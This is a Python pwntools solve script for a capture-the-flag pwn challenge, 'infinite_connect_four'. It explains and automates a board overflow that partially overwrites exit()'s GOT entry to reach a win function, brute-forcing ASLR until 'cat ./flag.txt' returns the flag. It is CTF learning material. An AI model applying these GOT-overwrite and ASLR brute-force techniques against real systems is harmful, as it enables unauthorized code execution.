"""
Idea:
    - infinite connect four board
    - game starts by defining symbols for two players
    - on your turn, you get to fill a specific column with your symbol
    - if the column is already filled, push it down (this is where the overflow occurs)
    - The overflow leads to an overwrite of the GOT
    - GOT entry for exit() is at something like 0x5918b8a2e060 while board is at 0x5918b8a2e0a0
    - GOT value for exit() is something like 0x5918b8a290c0 while address of win is 0x5918b8a29fc9 
    - The most significant 64-12=52 bits of the GOT entry and win functions are the same, and we just need to overwrite the 12 least significant bits of exit's GOT value to redirect control flow to win
    - However, since we overwrite 1 byte at a time, the 13-16th least significant bits (1-indexed) have to be overwritten, and we have a 1/16 chance of getting these bits correct (aslr bruteforce)
    - Simply run the script until we get the flag :)
"""

from pwn import *
# fill in binary name
elf = context.binary = ELF("./service/infinite_connect_four")
# fill in libc name
# libc = ELF("./distrib/libc.so.6")
# fill in ld name
# ld = ELF("./distrib/ld-linux-x86-64.so.2")
context.log_level = 'debug'

def insertatcol(x):
    p.sendlineafter(b"column (0 - 7) > ", str(x).encode())

while True:
    if args.REMOTE:
        # fill in remote address
        p = remote("challs.nusgreyhats.org", 33102)
    else:
        # p = process([ld.path, elf.path], env = {"LD_PRELOAD": libc.path})
        p = process()

    p.sendlineafter(b"> ", b"\x5f")
    p.sendlineafter(b"> ", b"\xc9")

    for _ in range(16):
        insertatcol(1)

    insertatcol(2)

    for _ in range(16):
        insertatcol(0)

    insertatcol(9)
    p.sendlineafter(b"erm... what the sigma?\n", b"cat ./flag.txt")   
    res = p.recvrepeat(0.5)
    info(res)
    if b"grey" in res:
        break
    else:
        p.close()